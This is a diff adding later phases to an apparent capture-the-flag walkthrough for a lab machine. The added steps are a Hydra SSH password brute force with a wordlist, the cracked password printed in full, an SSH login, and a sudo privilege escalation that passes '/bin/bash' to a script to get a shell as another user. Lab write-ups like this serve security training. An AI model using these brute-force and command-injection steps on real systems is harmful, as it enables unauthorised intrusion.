@@ -98,3 +98,74 @@ Upload QR code to: https://zxing.org/w/decode.jspx
 - information.txt → Username revealed: robin
 
 - p_lists.txt → SSH password wordlist obtained
+
+
+# Phase 4: SSH Brute Force
+
+## Hydra Attack
+
+    hydra -l robin -P p_lists.txt ssh://192.168.100.215
+
+<img width="933" height="254" alt="image" src="https://github.com/user-attachments/assets/030b7920-28c8-43fb-97a5-aec944e15409" />
+
+### Valid Credentials Discovered:
+
+    Username: robin
+    Password: k4rv3ndh4nh4ck3r
+
+# Phase 5: Initial Shell Access
+
+## SSH Login
+
+    ssh robin@192.168.100.215
+
+<img width="646" height="290" alt="image" src="https://github.com/user-attachments/assets/340a4091-8e8a-47fc-9591-7da055a946ae" />
+
+### Enumeration
+
+    ls -l
+    cat user1.txt
+
+<img width="471" height="182" alt="image" src="https://github.com/user-attachments/assets/5b83e30c-0b78-41b5-b2c2-ed2f5f35c6af" />
+
+Flag 1 captured
+
+
+# Phase 6: Lateral Privilege Escalation
+
+## Check Sudo Permissions
+
+    sudo -l
+
+<img width="887" height="104" alt="image" src="https://github.com/user-attachments/assets/4ba81efb-7cc3-4e71-9cc2-1c720c003d61" />
+
+## Explore Project Directory
+
+    cd project
+    ls
+    cat feedback.sh
+
+Finding: feedback.sh executable as user jerry
+
+<img width="596" height="261" alt="image" src="https://github.com/user-attachments/assets/fc455837-3d12-41c7-8cb8-bd0a232d290f" />
+
+## Script Exploitation
+
+    sudo -u jerry /home/robin/project/feedback.sh
+
+#### Script Interaction:
+
+- Name prompt → Enter: jerry
+- Feedback prompt → Enter: /bin/bash
+
+## Verify Escalation
+
+    ls
+    pwd
+    cd /home/jerry
+    ls
+    cat user2.txt
+
+<img width="734" height="557" alt="image" src="https://github.com/user-attachments/assets/558b9056-0f58-42e4-960d-5e7419dc0682" />
+
+ Flag 2 captured
